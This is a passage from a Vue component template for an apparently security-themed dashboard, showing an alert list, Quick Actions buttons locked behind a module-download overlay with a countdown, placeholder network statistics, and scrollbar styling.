                                        'w-2 h-2 bg-blue-500': alert.type === 'info',
                                        'w-2 h-2 bg-green-500': alert.type === 'success'
                                    }"></div>
                                </div>
                                <div class="flex-1 min-w-0">
                                    <p class="text-sm text-white">{{ alert.message }}</p>
                                    <p class="text-xs text-gray-400 mt-1">{{ alert.time }}</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Quick Actions -->
                    <div class="relative overflow-hidden bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                        <div class="p-4 border-b border-cyan-500/20">
                            <h3 class="text-lg font-semibold text-white">Quick Actions</h3>
                        </div>
                        <div class="p-4 space-y-3">
                            <button :disabled="areQuickActionsLocked" class="w-full bg-cyan-600 hover:bg-cyan-500 disabled:bg-cyan-800/60 disabled:text-cyan-100/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                Run Security Scan
                            </button>
                            <button :disabled="areQuickActionsLocked" class="w-full bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800/80 disabled:text-gray-300/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                View Logs
                            </button>
                            <button :disabled="areQuickActionsLocked" class="w-full bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800/80 disabled:text-gray-300/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                System Settings
                            </button>
                            <button :disabled="areQuickActionsLocked" class="w-full bg-red-600 hover:bg-red-500 disabled:bg-red-900/70 disabled:text-red-100/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                Emergency Lockdown
                            </button>
                        </div>

                        <div v-if="areQuickActionsLocked" class="absolute inset-0 z-10 flex flex-col items-center justify-center bg-black/75 px-6 text-center backdrop-blur-sm">
                            <div class="mb-4 h-14 w-14 rounded-full border-4 border-cyan-500/40 border-t-cyan-300 animate-spin"></div>
                            <p class="text-sm font-semibold uppercase tracking-[0.25em] text-cyan-300">Module download in progress</p>
                            <p class="mt-3 max-w-xs text-sm text-slate-300">Security command modules are being provisioned. These actions remain unavailable to users until the download window closes.</p>
                            <p class="mt-3 text-xs uppercase tracking-[0.2em] text-slate-400">Time remaining: {{ actionLockCountdown }}</p>
                        </div>
                    </div>
                </div>

                <!-- Network Activity -->
                <div class="mt-6 bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                    <div class="p-4 border-b border-cyan-500/20">
                        <h3 class="text-lg font-semibold text-white">Network Activity</h3>
                    </div>
                    <div class="p-4">
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                            <div class="text-center">
                                <div class="text-3xl font-mono text-cyan-400 mb-1">2.4K</div>
                                <div class="text-xs text-gray-400 uppercase">Packets/sec</div>
                            </div>
                            <div class="text-center">
                                <div class="text-3xl font-mono text-green-400 mb-1">98.2%</div>
                                <div class="text-xs text-gray-400 uppercase">Success Rate</div>
                            </div>
                            <div class="text-center">
                                <div class="text-3xl font-mono text-yellow-400 mb-1">12</div>
                                <div class="text-xs text-gray-400 uppercase">Active Connections</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </AuthenticatedLayout>
</template>

<style scoped>
/* Custom scrollbar for alerts */
.max-h-96::-webkit-scrollbar {
    width: 6px;
}

.max-h-96::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.1);
}

.max-h-96::-webkit-scrollbar-thumb {
    background: rgba(0, 186, 255, 0.3);
    border-radius: 3px;
}

.max-h-96::-webkit-scrollbar-thumb:hover {
    background: rgba(0, 186, 255, 0.5);
}
</style>
